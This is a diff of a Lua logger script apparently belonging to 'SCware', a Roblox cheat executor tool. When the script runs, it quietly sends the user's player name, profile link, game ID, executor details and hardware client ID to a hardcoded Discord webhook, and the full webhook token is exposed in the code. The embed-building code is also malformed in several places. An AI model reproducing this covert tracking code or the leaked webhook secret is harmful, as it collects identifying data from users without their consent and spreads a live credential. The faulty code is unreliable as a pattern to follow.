@@ -1,70 +1,69 @@
--- ffff00 hex color code
-
 local players = game:GetService("Players")
 local player = players.LocalPlayer
 local Date, Time = os.date(), os.time()
 local executor, version = identifyexecutor()
 
 https = game:GetService("HttpService")
-linkRequest = "https://discord.com/api/webhooks/1435519726033047603/L0qHy5q5Ir_QIu9DyvsDFRtb-C4A1EC3wZVXHk8Lkp0lPn16mv3k1HKalYjLAn68BQhc"
+HookRequest = "https://discord.com/api/webhooks/1435519726033047603/L0qHy5q5Ir_QIu9DyvsDFRtb-C4A1EC3wZVXHk8Lkp0lPn16mv3k1HKalYjLAn68BQhc"
 
-local responce = request({
-	
+
+body = https:JSONEncode({
+
+	['content'] = "",
+
+	['embeds'] = {
+
+		['title'] = "## SCware execution ##",
+
+		['descriptrion'] = player.Name .. " has executed SCware.",
+
+		['type'] = "rich",
+
+		['color'] = tonumber(000000),
+
+		['fields'] = {
+
+			['time'] = "Time:",
+			['TValue'] = Date, Time,
+
+
+			['profile'] = "profile:",
+			['PValue'] = "https://www.roblox.com/users/".. player.UserId .."/profile",
+
+
+			['game'] = "game:",
+			['GValue'] = "https://www.roblox.com/games/" .. game.GameId,
+
+
+			['executor'] = "executor:",
+			['EValue'] = executor,
+
+			['version'] = "version:",
+			['VValue'] = version,
+
+
+			['Hardware'] = "Hardware ID:",
+			['HValue'] = game:GetService("RbxAnalyticsService"):GetClientId(),
+
+			['inline'] = true
+		}
+	}
+})
+
+Responce = request({
+	Url = HookRequest,
+	Method = "POST",
+	Body = body
+})
+
+
+
+--[[requested = {
 	Url = linkRequest,
-	
-	Method = 'POST',
+	Method = "POST",
+	Body = body,
 	
 	Headers = {
 		['Content-Type'] = 'application/json'
-	},
-	
-	
-	Body = https:JSONEncode({
-		
-		['content'] = "",
-		
-		['embeds'] = {
-			
-			['title'] = "## SCware execution ##",
-			
-			['descriptrion'] = player.Name .. " has executed SCware.",
-			
-			['type'] = "rich",
-			
-			['color'] = tonumber(000000),
-			
-			['fields'] = {
-				
-				['time'] = "Time:",
-				['TValue'] = Date, Time,
-				
-				
-				['profile'] = "profile:",
-				['PValue'] = "https://www.roblox.com/users/".. player.UserId .."/profile",
-				
-				
-				['game'] = "game:",
-				['GValue'] = "https://www.roblox.com/games/" .. game.GameId,
-				
-				
-				
-				['executor'] = "executor:",
-				['EValue'] = executor,
-				
-				['version'] = "version:",
-				['VValue'] = version,
-				
-				
-				
-				['Hardware'] = "Hardware ID:",
-				['HValue'] = game:GetService("RbxAnalyticsService"):GetClientId(),
-				
-				
-				['inline'] = true
-			}
-			
-		}
-		
-	})
-	
-})
+	}
+}]]
